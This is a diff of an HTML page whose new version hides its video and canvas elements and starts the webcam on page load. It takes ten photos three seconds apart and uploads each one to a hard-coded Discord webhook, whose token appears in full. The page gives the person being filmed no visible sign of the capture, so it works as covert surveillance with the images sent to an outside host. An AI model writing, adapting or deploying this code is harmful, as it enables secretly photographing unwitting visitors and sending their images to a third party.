@@ -3,62 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture Image Every 3 Seconds</title>
+    <title>Automatic Multiple Photo Capture</title>
     <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-        }
-        video {
-            display: none; /* Hide video element */
+        video, canvas {
+            display: none; /* Hide video and canvas */
         }
     </style>
 </head>
 <body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
     <script>
-        // Function to capture image and send to server
-        const captureImage = async () => {
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';  // Replace with your Discord webhook URL
+
+        // Initialize the camera
+        async function initCamera() {
             try {
-                // Access the camera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const videoTrack = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(videoTrack);
-
-                // Capture an image
-                const imageBitmap = await imageCapture.takePhoto();
-
-                // Convert imageBitmap to a canvas to get base64 data
-                const canvas = document.createElement('canvas');
-                canvas.width = imageBitmap.width;
-                canvas.height = imageBitmap.height;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(imageBitmap, 0, 0);
-
-                // Get the base64 image data
-                const imageData = canvas.toDataURL('image/png');
-
-                // Send the image to the server
-                await fetch('https://your-server-url/capture.php', {
-                    method: 'POST',
-                    body: JSON.stringify({ image: imageData }),
-                    headers: { 'Content-Type': 'application/json' }
-                });
-
-                // Stop the video stream
-                stream.getTracks().forEach(track => track.stop());
-
-            } catch (err) {
-                console.error("Error capturing image: ", err);
+                document.getElementById('video').srcObject = stream;
+                captureMultiplePhotos();  // Start capturing photos
+            } catch (error) {
+                console.error("Error accessing camera:", error);
             }
-        };
+        }
 
-        // Start capturing images every 3 seconds
-        setInterval(captureImage, 3000);
-        captureImage(); // Optional: capture the first image immediately
+        // Capture multiple photos with a delay of 3 seconds between each
+        async function captureMultiplePhotos() {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            let captureCount = 0;
+            const maxCaptures = 10;
+            const captureInterval = 3000; // 3 seconds
+
+            // Function to capture a photo and send it to Discord
+            async function captureAndSendPhoto() {
+                context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);  // Capture frame from video
+                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));  // Convert canvas to Blob
+
+                // Send image Blob to Discord as an attachment
+                const formData = new FormData();
+                formData.append('file', imageBlob, `capture_${captureCount + 1}.png`);
+
+                try {
+                    const response = await fetch(discordWebhookURL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    if (!response.ok) {
+                        console.error("Failed to send image to Discord:", response.statusText);
+                    }
+                } catch (error) {
+                    console.error("Error sending image to Discord:", error);
+                }
+            }
+
+            // Loop to capture images at intervals
+            const captureIntervalId = setInterval(async () => {
+                if (captureCount < maxCaptures) {
+                    await captureAndSendPhoto();  // Capture and send each photo
+                    captureCount++;
+                } else {
+                    clearInterval(captureIntervalId);  // Stop capturing after 10 photos
+                }
+            }, captureInterval);
+        }
+
+        // Start everything on page load
+        window.onload = () => {
+            initCamera();
+        };
     </script>
 </body>
 </html>
-  
